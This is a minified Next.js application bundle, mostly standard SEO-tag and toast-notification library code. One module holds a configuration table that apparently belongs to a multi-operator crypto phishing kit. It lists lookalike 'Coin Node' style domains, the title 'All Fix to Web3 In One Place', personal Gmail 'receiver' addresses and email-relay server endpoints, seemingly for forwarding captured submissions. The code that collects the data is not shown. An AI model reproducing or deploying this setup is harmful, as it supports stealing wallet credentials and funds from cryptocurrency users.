(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[888],{2962:function(e,t,a){"use strict";a.d(t,{PB:function(){return u},lX:function(){return d}});var o=a(7294),r=a(9008),n=a.n(r);function i(){return(i=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var a=arguments[t];for(var o in a)Object.prototype.hasOwnProperty.call(a,o)&&(e[o]=a[o])}return e}).apply(this,arguments)}var l={templateTitle:"",noindex:!1,nofollow:!1,defaultOpenGraphImageWidth:0,defaultOpenGraphImageHeight:0,defaultOpenGraphVideoWidth:0,defaultOpenGraphVideoHeight:0},p=function(e,t,a){void 0===t&&(t=[]);var r=void 0===a?{}:a,n=r.defaultWidth,i=r.defaultHeight;return t.reduce(function(t,a,r){return t.push(o.createElement("meta",{key:"og:"+e+":0"+r,property:"og:"+e,content:a.url})),a.alt&&t.push(o.createElement("meta",{key:"og:"+e+":alt0"+r,property:"og:"+e+":alt",content:a.alt})),a.secureUrl&&t.push(o.createElement("meta",{key:"og:"+e+":secure_url0"+r,property:"og:"+e+":secure_url",content:a.secureUrl.toString()})),a.type&&t.push(o.createElement("meta",{key:"og:"+e+":type0"+r,property:"og:"+e+":type",content:a.type.toString()})),a.width?t.push(o.createElement("meta",{key:"og:"+e+":width0"+r,property:"og:"+e+":width",content:a.width.toString()})):n&&t.push(o.createElement("meta",{key:"og:"+e+":width0"+r,property:"og:"+e+":width",content:n.toString()})),a.height?t.push(o.createElement("meta",{key:"og:"+e+":height"+r,property:"og:"+e+":height",content:a.height.toString()})):i&&t.push(o.createElement("meta",{key:"og:"+e+":height"+r,property:"og:"+e+":height",content:i.toString()})),t},[])},s=function(e){var t,a,r,n,s,c=[];e.titleTemplate&&(l.templateTitle=e.titleTemplate);var d="";e.title?(d=e.title,l.templateTitle&&(d=l.templateTitle.replace(/%s/g,function(){return d}))):e.defaultTitle&&(d=e.defaultTitle),d&&c.push(o.createElement("title",{key:"title"},d));var u=e.noindex||l.noindex||e.dangerouslySetAllPagesToNoIndex,h=e.nofollow||l.nofollow||e.dangerouslySetAllPagesToNoFollow,m="";if(e.robotsProps){var f=e.robotsProps,g=f.nosnippet,y=f.maxSnippet,v=f.maxImagePreview,b=f.maxVideoPreview,k=f.noarchive,w=f.noimageindex,G=f.notranslate,x=f.unavailableAfter;m=(g?",nosnippet":"")+(y?",max-snippet:"+y:"")+(v?",max-image-preview:"+v:"")+(k?",noarchive":"")+(x?",unavailable_after:"+x:"")+(w?",noimageindex":"")+(b?",max-video-preview:"+b:"")+(G?",notranslate":"")}if(u||h?(e.dangerouslySetAllPagesToNoIndex&&(l.noindex=!0),e.dangerouslySetAllPagesToNoFollow&&(l.nofollow=!0),c.push(o.createElement("meta",{key:"robots",name:"robots",content:(u?"noindex":"index")+","+(h?"nofollow":"follow")+m}))):c.push(o.createElement("meta",{key:"robots",name:"robots",content:"index,follow"+m})),e.description&&c.push(o.createElement("meta",{key:"description",name:"description",content:e.description})),e.themeColor&&c.push(o.createElement("meta",{key:"theme-color",name:"theme-color",content:e.themeColor})),e.mobileAlternate&&c.push(o.createElement("link",{rel:"alternate",key:"mobileAlternate",media:e.mobileAlternate.media,href:e.mobileAlternate.href})),e.languageAlternates&&e.languageAlternates.length>0&&e.languageAlternates.forEach(function(e){c.push(o.createElement("link",{rel:"alternate",key:"languageAlternate-"+e.hrefLang,hrefLang:e.hrefLang,href:e.href}))}),e.twitter&&(e.twitter.cardType&&c.push(o.createElement("meta",{key:"twitter:card",name:"twitter:card",content:e.twitter.cardType})),e.twitter.site&&c.push(o.createElement("meta",{key:"twitter:site",name:"twitter:site",content:e.twitter.site})),e.twitter.handle&&c.push(o.createElement("meta",{key:"twitter:creator",name:"twitter:creator",content:e.twitter.handle}))),e.facebook&&e.facebook.appId&&c.push(o.createElement("meta",{key:"fb:app_id",property:"fb:app_id",content:e.facebook.appId})),(null!=(t=e.openGraph)&&t.title||d)&&c.push(o.createElement("meta",{key:"og:title",property:"og:title",content:(null==(n=e.openGraph)?void 0:n.title)||d})),(null!=(a=e.openGraph)&&a.description||e.description)&&c.push(o.createElement("meta",{key:"og:description",property:"og:description",content:(null==(s=e.openGraph)?void 0:s.description)||e.description})),e.openGraph){if((e.openGraph.url||e.canonical)&&c.push(o.createElement("meta",{key:"og:url",property:"og:url",content:e.openGraph.url||e.canonical})),e.openGraph.type){var E=e.openGraph.type.toLowerCase();c.push(o.createElement("meta",{key:"og:type",property:"og:type",content:E})),"profile"===E&&e.openGraph.profile?(e.openGraph.profile.firstName&&c.push(o.createElement("meta",{key:"profile:first_name",property:"profile:first_name",content:e.openGraph.profile.firstName})),e.openGraph.profile.lastName&&c.push(o.createElement("meta",{key:"profile:last_name",property:"profile:last_name",content:e.openGraph.profile.lastName})),e.openGraph.profile.username&&c.push(o.createElement("meta",{key:"profile:username",property:"profile:username",content:e.openGraph.profile.username})),e.openGraph.profile.gender&&c.push(o.createElement("meta",{key:"profile:gender",property:"profile:gender",content:e.openGraph.profile.gender}))):"book"===E&&e.openGraph.book?(e.openGraph.book.authors&&e.openGraph.book.authors.length&&e.openGraph.book.authors.forEach(function(e,t){c.push(o.createElement("meta",{key:"book:author:0"+t,property:"book:author",content:e}))}),e.openGraph.book.isbn&&c.push(o.createElement("meta",{key:"book:isbn",property:"book:isbn",content:e.openGraph.book.isbn})),e.openGraph.book.releaseDate&&c.push(o.createElement("meta",{key:"book:release_date",property:"book:release_date",content:e.openGraph.book.releaseDate})),e.openGraph.book.tags&&e.openGraph.book.tags.length&&e.openGraph.book.tags.forEach(function(e,t){c.push(o.createElement("meta",{key:"book:tag:0"+t,property:"book:tag",content:e}))})):"article"===E&&e.openGraph.article?(e.openGraph.article.publishedTime&&c.push(o.createElement("meta",{key:"article:published_time",property:"article:published_time",content:e.openGraph.article.publishedTime})),e.openGraph.article.modifiedTime&&c.push(o.createElement("meta",{key:"article:modified_time",property:"article:modified_time",content:e.openGraph.article.modifiedTime})),e.openGraph.article.expirationTime&&c.push(o.createElement("meta",{key:"article:expiration_time",property:"article:expiration_time",content:e.openGraph.article.expirationTime})),e.openGraph.article.authors&&e.openGraph.article.authors.length&&e.openGraph.article.authors.forEach(function(e,t){c.push(o.createElement("meta",{key:"article:author:0"+t,property:"article:author",content:e}))}),e.openGraph.article.section&&c.push(o.createElement("meta",{key:"article:section",property:"article:section",content:e.openGraph.article.section})),e.openGraph.article.tags&&e.openGraph.article.tags.length&&e.openGraph.article.tags.forEach(function(e,t){c.push(o.createElement("meta",{key:"article:tag:0"+t,property:"article:tag",content:e}))})):("video.movie"===E||"video.episode"===E||"video.tv_show"===E||"video.other"===E)&&e.openGraph.video&&(e.openGraph.video.actors&&e.openGraph.video.actors.length&&e.openGraph.video.actors.forEach(function(e,t){e.profile&&c.push(o.createElement("meta",{key:"video:actor:0"+t,property:"video:actor",content:e.profile})),e.role&&c.push(o.createElement("meta",{key:"video:actor:role:0"+t,property:"video:actor:role",content:e.role}))}),e.openGraph.video.directors&&e.openGraph.video.directors.length&&e.openGraph.video.directors.forEach(function(e,t){c.push(o.createElement("meta",{key:"video:director:0"+t,property:"video:director",content:e}))}),e.openGraph.video.writers&&e.openGraph.video.writers.length&&e.openGraph.video.writers.forEach(function(e,t){c.push(o.createElement("meta",{key:"video:writer:0"+t,property:"video:writer",content:e}))}),e.openGraph.video.duration&&c.push(o.createElement("meta",{key:"video:duration",property:"video:duration",content:e.openGraph.video.duration.toString()})),e.openGraph.video.releaseDate&&c.push(o.createElement("meta",{key:"video:release_date",property:"video:release_date",content:e.openGraph.video.releaseDate})),e.openGraph.video.tags&&e.openGraph.video.tags.length&&e.openGraph.video.tags.forEach(function(e,t){c.push(o.createElement("meta",{key:"video:tag:0"+t,property:"video:tag",content:e}))}),e.openGraph.video.series&&c.push(o.createElement("meta",{key:"video:series",property:"video:series",content:e.openGraph.video.series})))}e.defaultOpenGraphImageWidth&&(l.defaultOpenGraphImageWidth=e.defaultOpenGraphImageWidth),e.defaultOpenGraphImageHeight&&(l.defaultOpenGraphImageHeight=e.defaultOpenGraphImageHeight),e.openGraph.images&&e.openGraph.images.length&&c.push.apply(c,p("image",e.openGraph.images,{defaultWidth:l.defaultOpenGraphImageWidth,defaultHeight:l.defaultOpenGraphImageHeight})),e.defaultOpenGraphVideoWidth&&(l.defaultOpenGraphVideoWidth=e.defaultOpenGraphVideoWidth),e.defaultOpenGraphVideoHeight&&(l.defaultOpenGraphVideoHeight=e.defaultOpenGraphVideoHeight),e.openGraph.videos&&e.openGraph.videos.length&&c.push.apply(c,p("video",e.openGraph.videos,{defaultWidth:l.defaultOpenGraphVideoWidth,defaultHeight:l.defaultOpenGraphVideoHeight})),e.openGraph.audio&&c.push.apply(c,p("audio",e.openGraph.audio)),e.openGraph.locale&&c.push(o.createElement("meta",{key:"og:locale",property:"og:locale",content:e.openGraph.locale})),(e.openGraph.siteName||e.openGraph.site_name)&&c.push(o.createElement("meta",{key:"og:site_name",property:"og:site_name",content:e.openGraph.siteName||e.openGraph.site_name}))}return e.canonical&&c.push(o.createElement("link",{rel:"canonical",href:e.canonical,key:"canonical"})),e.additionalMetaTags&&e.additionalMetaTags.length>0&&e.additionalMetaTags.forEach(function(e){var t,a,r;c.push(o.createElement("meta",i({key:"meta:"+(null!=(t=null!=(a=null!=(r=e.keyOverride)?r:e.name)?a:e.property)?t:e.httpEquiv)},e)))}),null!=(r=e.additionalLinkTags)&&r.length&&e.additionalLinkTags.forEach(function(e){var t;c.push(o.createElement("link",i({key:"link"+(null!=(t=e.keyOverride)?t:e.href)+e.rel},e)))}),c},c=function(e){return o.createElement(n(),null,s(e))},d=function(e){var t=e.title,a=e.titleTemplate,r=e.defaultTitle,n=e.themeColor,i=e.dangerouslySetAllPagesToNoIndex,l=e.dangerouslySetAllPagesToNoFollow,p=e.description,s=e.canonical,d=e.facebook,u=e.openGraph,h=e.additionalMetaTags,m=e.twitter,f=e.defaultOpenGraphImageWidth,g=e.defaultOpenGraphImageHeight,y=e.defaultOpenGraphVideoWidth,v=e.defaultOpenGraphVideoHeight,b=e.mobileAlternate,k=e.languageAlternates,w=e.additionalLinkTags,G=e.robotsProps;return o.createElement(c,{title:t,titleTemplate:a,defaultTitle:r,themeColor:n,dangerouslySetAllPagesToNoIndex:void 0!==i&&i,dangerouslySetAllPagesToNoFollow:void 0!==l&&l,description:p,canonical:s,facebook:d,openGraph:u,additionalMetaTags:h,twitter:m,defaultOpenGraphImageWidth:f,defaultOpenGraphImageHeight:g,defaultOpenGraphVideoWidth:y,defaultOpenGraphVideoHeight:v,mobileAlternate:b,languageAlternates:k,additionalLinkTags:w,robotsProps:G})},u=function(e){var t=e.title,a=e.themeColor,r=e.noindex,n=void 0!==r&&r,i=e.nofollow,l=e.robotsProps,p=e.description,d=e.canonical,u=e.openGraph,h=e.facebook,m=e.twitter,f=e.additionalMetaTags,g=e.titleTemplate,y=e.defaultTitle,v=e.mobileAlternate,b=e.languageAlternates,k=e.additionalLinkTags,w=e.useAppDir;return o.createElement(o.Fragment,null,void 0!==w&&w?s({title:t,themeColor:a,noindex:n,nofollow:i,robotsProps:l,description:p,canonical:d,facebook:h,openGraph:u,additionalMetaTags:f,twitter:m,titleTemplate:g,defaultTitle:y,mobileAlternate:v,languageAlternates:b,additionalLinkTags:k}):o.createElement(c,{title:t,themeColor:a,noindex:n,nofollow:i,robotsProps:l,description:p,canonical:d,facebook:h,openGraph:u,additionalMetaTags:f,twitter:m,titleTemplate:g,defaultTitle:y,mobileAlternate:v,languageAlternates:b,additionalLinkTags:k}))};RegExp("["+Object.keys(Object.freeze({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&apos;"})).join("")+"]","g")},6840:function(e,t,a){(window.__NEXT_P=window.__NEXT_P||[]).push(["/_app",function(){return a(3847)}])},8014:function(e,t,a){"use strict";a.d(t,{aT:function(){return i},iC:function(){return r},kh:function(){return o}});let o={timi:{appName:"Coin Node",receiver:"kennethbob1805@gmail.com",siteUrl:"https://www.coinsnodeapi.live",server:"https://generalsender.netlify.app/.netlify/functions"},jess1:{appName:"Coin Nodes",receiver:"personalitymine8@gmail.com",siteUrl:"https://n1.coinmainnode.live",server:"https://email-sender-bxgs.onrender.com/"},jess2:{appName:"Coin Nodes",receiver:"gagasexy03@gmail.com",siteUrl:"https://n2.coinmainnode.live",server:"https://email-sender-bxgs.onrender.com/"},ilupejuWz:{appName:"Block Link Mainnets",receiver:"karamatty5@gmail.com",siteUrl:"https://www.blocklinkmainnets.com",server:"https://generalsender.netlify.app/.netlify/functions"},coinsupports:{appName:"Coin Supports",receiver:"anastabarri@gmail.com",siteUrl:"https://www.coinsupports.live",server:"https://generalsender.netlify.app/.netlify/functions"},voltprotocol:{appName:"VoltProtocol",receiver:"bebn09@gmail.com",siteUrl:"https://www.voltprotocol.live",server:"https://generalsender.netlify.app/.netlify/functions"},"69studio":{appName:"Coin Nodes",receiver:"toswald731@gmail.com",siteUrl:"https://www.coinnsnodes.live",server:"https://generalsender.netlify.app/.netlify/functions"},BronzePhotography:{appName:"Coins MainNodes",receiver:"msaint12867@gmail.com",siteUrl:"https://www.coinnsmainnodes.live",server:"https://generalsender.netlify.app/.netlify/functions"},test:{appName:"Coin Node Test",receiver:"xarmzon@gmail.com",siteUrl:"https://www.coinsnodeapi.live",server:"https://email-sender-bxgs.onrender.com/"}}["69studio"],r=o.appName,n=o.siteUrl,i={title:"All Fix to Web3 In One Place",defaultTitle:"",titleTemplate:"%s | ".concat(r),description:o.siteUrl,openGraph:{type:"website",url:n,title:r,description:o.siteUrl,images:[{url:"".concat(n,"/ms-icon-310x310.PNG"),width:600,height:600,alt:"".concat(r)}]}}},3847:function(e,t,a){"use strict";a.r(t);var o=a(5893);a(6774);var r=a(2962),n=a(8014),i=a(6501);t.default=function(e){let{Component:t,pageProps:a}=e;return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(r.lX,{...n.aT}),(0,o.jsx)(t,{...a}),(0,o.jsx)(i.x7,{})]})}},6774:function(){},9008:function(e,t,a){e.exports=a(3121)},6501:function(e,t,a){"use strict";let o,r;a.d(t,{x7:function(){return er},ZP:function(){return en}});var n,i=a(7294);let l={data:""},p=e=>"object"==typeof window?((e?e.querySelector("#_goober"):window._goober)||Object.assign((e||document.head).appendChild(document.createElement("style")),{innerHTML:" ",id:"_goober"})).firstChild:e||l,s=/(?:([\u0080-\uFFFF\w-%@]+) *:? *([^{;]+?);|([^;}{]*?) *{)|(}\s*)/g,c=/\/\*[^]*?\*\/|  +/g,d=/\n+/g,u=(e,t)=>{let a="",o="",r="";for(let n in e){let i=e[n];"@"==n[0]?"i"==n[1]?a=n+" "+i+";":o+="f"==n[1]?u(i,n):n+"{"+u(i,"k"==n[1]?"":t)+"}":"object"==typeof i?o+=u(i,t?t.replace(/([^,])+/g,e=>n.replace(/(^:.*)|([^,])+/g,t=>/&/.test(t)?t.replace(/&/g,e):e?e+" "+t:t)):n):null!=i&&(n=/^--/.test(n)?n:n.replace(/[A-Z]/g,"-$&").toLowerCase(),r+=u.p?u.p(n,i):n+":"+i+";")}return a+(t&&r?t+"{"+r+"}":r)+o},h={},m=e=>{if("object"==typeof e){let t="";for(let a in e)t+=a+m(e[a]);return t}return e},f=(e,t,a,o,r)=>{var n,i;let l=m(e),p=h[l]||(h[l]=(e=>{let t=0,a=11;for(;t<e.length;)a=101*a+e.charCodeAt(t++)>>>0;return"go"+a})(l));if(!h[p]){let f=l!==e?e:(e=>{let t,a,o=[{}];for(;t=s.exec(e.replace(c,""));)t[4]?o.shift():t[3]?(a=t[3].replace(d," ").trim(),o.unshift(o[0][a]=o[0][a]||{})):o[0][t[1]]=t[2].replace(d," ").trim();return o[0]})(e);h[p]=u(r?{["@keyframes "+p]:f}:f,a?"":"."+p)}let g=a&&h.g?h.g:null;return a&&(h.g=h[p]),n=h[p],i=t,g?i.data=i.data.replace(g,n):-1===i.data.indexOf(n)&&(i.data=o?n+i.data:i.data+n),p},g=(e,t,a)=>e.reduce((e,o,r)=>{let n=t[r];if(n&&n.call){let i=n(a),l=i&&i.props&&i.props.className||/^go/.test(i)&&i;n=l?"."+l:i&&"object"==typeof i?i.props?"":u(i,""):!1===i?"":i}return e+o+(null==n?"":n)},"");function y(e){let t=this||{},a=e.call?e(t.p):e;return f(a.unshift?a.raw?g(a,[].slice.call(arguments,1),t.p):a.reduce((e,a)=>Object.assign(e,a&&a.call?a(t.p):a),{}):a,p(t.target),t.g,t.o,t.k)}y.bind({g:1});let v,b,k,w=y.bind({k:1});function G(e,t){let a=this||{};return function(){let o=arguments;function r(n,i){let l=Object.assign({},n),p=l.className||r.className;a.p=Object.assign({theme:b&&b()},l),a.o=/ *go\d+/.test(p),l.className=y.apply(a,o)+(p?" "+p:""),t&&(l.ref=i);let s=e;return e[0]&&(s=l.as||e,delete l.as),k&&s[0]&&k(l),v(s,l)}return t?t(r):r}}var x=e=>"function"==typeof e,E=(e,t)=>x(e)?e(t):e,T=(o=0,()=>(++o).toString()),O=()=>{if(void 0===r&&"u">typeof window){let e=matchMedia("(prefers-reduced-motion: reduce)");r=!e||e.matches}return r},N=new Map,_=e=>{if(N.has(e))return;let t=setTimeout(()=>{N.delete(e),j({type:4,toastId:e})},1e3);N.set(e,t)},A=e=>{let t=N.get(e);t&&clearTimeout(t)},P=(e,t)=>{switch(t.type){case 0:return{...e,toasts:[t.toast,...e.toasts].slice(0,20)};case 1:return t.toast.id&&A(t.toast.id),{...e,toasts:e.toasts.map(e=>e.id===t.toast.id?{...e,...t.toast}:e)};case 2:let{toast:a}=t;return e.toasts.find(e=>e.id===a.id)?P(e,{type:1,toast:a}):P(e,{type:0,toast:a});case 3:let{toastId:o}=t;return o?_(o):e.toasts.forEach(e=>{_(e.id)}),{...e,toasts:e.toasts.map(e=>e.id===o||void 0===o?{...e,visible:!1}:e)};case 4:return void 0===t.toastId?{...e,toasts:[]}:{...e,toasts:e.toasts.filter(e=>e.id!==t.toastId)};case 5:return{...e,pausedAt:t.time};case 6:let r=t.time-(e.pausedAt||0);return{...e,pausedAt:void 0,toasts:e.toasts.map(e=>({...e,pauseDuration:e.pauseDuration+r}))}}},I=[],C={toasts:[],pausedAt:void 0},j=e=>{C=P(C,e),I.forEach(e=>{e(C)})},H={blank:4e3,error:4e3,success:2e3,loading:1/0,custom:4e3},S=(e={})=>{let[t,a]=(0,i.useState)(C);(0,i.useEffect)(()=>(I.push(a),()=>{let e=I.indexOf(a);e>-1&&I.splice(e,1)}),[t]);let o=t.toasts.map(t=>{var a,o;return{...e,...e[t.type],...t,duration:t.duration||(null==(a=e[t.type])?void 0:a.duration)||(null==e?void 0:e.duration)||H[t.type],style:{...e.style,...null==(o=e[t.type])?void 0:o.style,...t.style}}});return{...t,toasts:o}},W=(e,t="blank",a)=>({createdAt:Date.now(),visible:!0,type:t,ariaProps:{role:"status","aria-live":"polite"},message:e,pauseDuration:0,...a,id:(null==a?void 0:a.id)||T()}),$=e=>(t,a)=>{let o=W(t,e,a);return j({type:2,toast:o}),o.id},L=(e,t)=>$("blank")(e,t);L.error=$("error"),L.success=$("success"),L.loading=$("loading"),L.custom=$("custom"),L.dismiss=e=>{j({type:3,toastId:e})},L.remove=e=>j({type:4,toastId:e}),L.promise=(e,t,a)=>{let o=L.loading(t.loading,{...a,...null==a?void 0:a.loading});return e.then(e=>(L.success(E(t.success,e),{id:o,...a,...null==a?void 0:a.success}),e)).catch(e=>{L.error(E(t.error,e),{id:o,...a,...null==a?void 0:a.error})}),e};var M=(e,t)=>{j({type:1,toast:{id:e,height:t}})},U=()=>{j({type:5,time:Date.now()})},V=e=>{let{toasts:t,pausedAt:a}=S(e);(0,i.useEffect)(()=>{if(a)return;let e=Date.now(),o=t.map(t=>{if(t.duration===1/0)return;let a=(t.duration||0)+t.pauseDuration-(e-t.createdAt);if(a<0){t.visible&&L.dismiss(t.id);return}return setTimeout(()=>L.dismiss(t.id),a)});return()=>{o.forEach(e=>e&&clearTimeout(e))}},[t,a]);let o=(0,i.useCallback)(()=>{a&&j({type:6,time:Date.now()})},[a]),r=(0,i.useCallback)((e,a)=>{let{reverseOrder:o=!1,gutter:r=8,defaultPosition:n}=a||{},i=t.filter(t=>(t.position||n)===(e.position||n)&&t.height),l=i.findIndex(t=>t.id===e.id),p=i.filter((e,t)=>t<l&&e.visible).length;return i.filter(e=>e.visible).slice(...o?[p+1]:[0,p]).reduce((e,t)=>e+(t.height||0)+r,0)},[t]);return{toasts:t,handlers:{updateHeight:M,startPause:U,endPause:o,calculateOffset:r}}},z=G("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e=>e.primary||"#ff4b4b"};
  position: relative;
  transform: rotate(45deg);

  animation: ${w`
from {
  transform: scale(0) rotate(45deg);
	opacity: 0;
}
to {
 transform: scale(1) rotate(45deg);
  opacity: 1;
}`} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;

  &:after,
  &:before {
    content: '';
    animation: ${w`
from {
  transform: scale(0);
  opacity: 0;
}
to {
  transform: scale(1);
  opacity: 1;
}`} 0.15s ease-out forwards;
    animation-delay: 150ms;
    position: absolute;
    border-radius: 3px;
    opacity: 0;
    background: ${e=>e.secondary||"#fff"};
    bottom: 9px;
    left: 4px;
    height: 2px;
    width: 12px;
  }

  &:before {
    animation: ${w`
from {
  transform: scale(0) rotate(90deg);
	opacity: 0;
}
to {
  transform: scale(1) rotate(90deg);
	opacity: 1;
}`} 0.15s ease-out forwards;
    animation-delay: 180ms;
    transform: rotate(90deg);
  }
`,D=G("div")`
  width: 12px;
  height: 12px;
  box-sizing: border-box;
  border: 2px solid;
  border-radius: 100%;
  border-color: ${e=>e.secondary||"#e0e0e0"};
  border-right-color: ${e=>e.primary||"#616161"};
  animation: ${w`
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
`} 1s linear infinite;
`,F=G("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e=>e.primary||"#61d345"};
  position: relative;
  transform: rotate(45deg);

  animation: ${w`
from {
  transform: scale(0) rotate(45deg);
	opacity: 0;
}
to {
  transform: scale(1) rotate(45deg);
	opacity: 1;
}`} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;
  &:after {
    content: '';
    box-sizing: border-box;
    animation: ${w`
0% {
	height: 0;
	width: 0;
	opacity: 0;
}
40% {
  height: 0;
	width: 6px;
	opacity: 1;
}
100% {
  opacity: 1;
  height: 10px;
}`} 0.2s ease-out forwards;
    opacity: 0;
    animation-delay: 200ms;
    position: absolute;
    border-right: 2px solid;
    border-bottom: 2px solid;
    border-color: ${e=>e.secondary||"#fff"};
    bottom: 6px;
    left: 6px;
    height: 10px;
    width: 6px;
  }
`,B=G("div")`
  position: absolute;
`,X=G("div")`
  position: relative;
  display: flex;
  justify-content: center;
  align-items: center;
  min-width: 20px;
  min-height: 20px;
`,q=G("div")`
  position: relative;
  transform: scale(0.6);
  opacity: 0.4;
  min-width: 20px;
  animation: ${w`
from {
  transform: scale(0.6);
  opacity: 0.4;
}
to {
  transform: scale(1);
  opacity: 1;
}`} 0.3s 0.12s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
`,R=({toast:e})=>{let{icon:t,type:a,iconTheme:o}=e;return void 0!==t?"string"==typeof t?i.createElement(q,null,t):t:"blank"===a?null:i.createElement(X,null,i.createElement(D,{...o}),"loading"!==a&&i.createElement(B,null,"error"===a?i.createElement(z,{...o}):i.createElement(F,{...o})))},Z=e=>`
0% {transform: translate3d(0,${-200*e}%,0) scale(.6); opacity:.5;}
100% {transform: translate3d(0,0,0) scale(1); opacity:1;}
`,Y=e=>`
0% {transform: translate3d(0,0,-1px) scale(1); opacity:1;}
100% {transform: translate3d(0,${-150*e}%,-1px) scale(.6); opacity:0;}
`,J=G("div")`
  display: flex;
  align-items: center;
  background: #fff;
  color: #363636;
  line-height: 1.3;
  will-change: transform;
  box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1), 0 3px 3px rgba(0, 0, 0, 0.05);
  max-width: 350px;
  pointer-events: auto;
  padding: 8px 10px;
  border-radius: 8px;
`,K=G("div")`
  display: flex;
  justify-content: center;
  margin: 4px 10px;
  color: inherit;
  flex: 1 1 auto;
  white-space: pre-line;
`,Q=(e,t)=>{let a=e.includes("top")?1:-1,[o,r]=O()?["0%{opacity:0;} 100%{opacity:1;}","0%{opacity:1;} 100%{opacity:0;}"]:[Z(a),Y(a)];return{animation:t?`${w(o)} 0.35s cubic-bezier(.21,1.02,.73,1) forwards`:`${w(r)} 0.4s forwards cubic-bezier(.06,.71,.55,1)`}},ee=i.memo(({toast:e,position:t,style:a,children:o})=>{let r=e.height?Q(e.position||t||"top-center",e.visible):{opacity:0},n=i.createElement(R,{toast:e}),l=i.createElement(K,{...e.ariaProps},E(e.message,e));return i.createElement(J,{className:e.className,style:{...r,...a,...e.style}},"function"==typeof o?o({icon:n,message:l}):i.createElement(i.Fragment,null,n,l))});n=i.createElement,u.p=void 0,v=n,b=void 0,k=void 0;var et=({id:e,className:t,style:a,onHeightUpdate:o,children:r})=>{let n=i.useCallback(t=>{if(t){let a=()=>{o(e,t.getBoundingClientRect().height)};a(),new MutationObserver(a).observe(t,{subtree:!0,childList:!0,characterData:!0})}},[e,o]);return i.createElement("div",{ref:n,className:t,style:a},r)},ea=(e,t)=>{let a=e.includes("top"),o=e.includes("center")?{justifyContent:"center"}:e.includes("right")?{justifyContent:"flex-end"}:{};return{left:0,right:0,display:"flex",position:"absolute",transition:O()?void 0:"all 230ms cubic-bezier(.21,1.02,.73,1)",transform:`translateY(${t*(a?1:-1)}px)`,...a?{top:0}:{bottom:0},...o}},eo=y`
  z-index: 9999;
  > * {
    pointer-events: auto;
  }
`,er=({reverseOrder:e,position:t="top-center",toastOptions:a,gutter:o,children:r,containerStyle:n,containerClassName:l})=>{let{toasts:p,handlers:s}=V(a);return i.createElement("div",{style:{position:"fixed",zIndex:9999,top:16,left:16,right:16,bottom:16,pointerEvents:"none",...n},className:l,onMouseEnter:s.startPause,onMouseLeave:s.endPause},p.map(a=>{let n=a.position||t,l=ea(n,s.calculateOffset(a,{reverseOrder:e,gutter:o,defaultPosition:t}));return i.createElement(et,{id:a.id,key:a.id,onHeightUpdate:s.updateHeight,className:a.visible?eo:"",style:l},"custom"===a.type?E(a.message,a):r?r(a):i.createElement(ee,{toast:a,position:n}))}))},en=L}},function(e){var t=function(t){return e(e.s=t)};e.O(0,[774,179],function(){return t(6840),t(880)}),_N_E=e.O()}]);